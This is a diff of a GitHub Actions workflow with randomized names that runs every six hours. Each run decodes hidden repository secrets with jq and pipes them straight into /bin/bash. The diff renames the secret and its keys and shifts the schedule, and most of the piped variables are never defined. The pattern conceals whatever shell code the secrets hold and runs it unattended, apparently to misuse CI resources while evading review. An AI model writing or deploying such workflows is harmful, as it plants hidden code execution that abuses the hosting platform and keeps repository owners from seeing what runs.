@@ -1,21 +1,19 @@
 name: candidateelectronic
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 5/6 * * *'
-
-jobs:  # 16363
+    - cron: '55 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: candidateelectronic
         env:
-          glw1752: ${{ secrets.glw1752 }}
+          l1919: ${{ secrets.l1919 }}
         run: |
-          echo $glw1752 | jq -r .xmy241 | /bin/bash
-          echo $bmw55 | jq -r .sdcgq3 | /bin/bash
-          echo $du57096 | jq -r .rsl3 | /bin/bash
-          echo $i7 | jq -r .g5 | /bin/bash
+          echo $l1919 | jq -r .jdotz1 | /bin/bash
+          echo $pl47513 | jq -r .fwgp7 | /bin/bash
+          echo $xsms3866 | jq -r .us80876 | /bin/bash
+          echo $geib99350 | jq -r .aucb0377 | /bin/bash
 
